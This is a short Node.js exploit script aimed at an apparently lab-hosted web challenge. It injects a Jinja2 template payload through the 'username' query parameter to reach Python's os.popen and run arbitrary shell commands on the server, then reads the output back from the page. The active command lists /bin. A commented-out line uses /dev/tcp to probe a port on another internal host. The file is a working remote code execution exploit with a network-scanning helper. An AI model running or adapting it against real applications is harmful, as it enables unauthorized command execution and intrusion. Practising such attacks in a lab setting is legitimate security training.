#!/bin/env node

import axios from 'axios'

const url = 'https://ssti4.secu-web.blackfoot.dev'

function makeCmd(cmd, stderr=true) {
	if (stderr) {
		cmd += ' 2>&1 | cat'
	}

	return encodeURIComponent(`{{request.application.__globals__.__builtins__.__import__('os').popen('${cmd}').read()}}`)
}

async function runCmd(cmd, stderr=true) {
	const res = await axios({
		method: 'get',
		url: `${url}?username=${makeCmd(cmd, stderr)}`
	})

	const match = res.data.match(/Hello '(.*)'/s)
	return match[1]
}

async function main() { 
	// const res = await runCmd(`timeout 1 bash -c "</dev/tcp/toto8042/4242" && echo -n open || echo -n closed`)
	const res = await runCmd(`ls /bin`)
	console.log(res)
}

main()
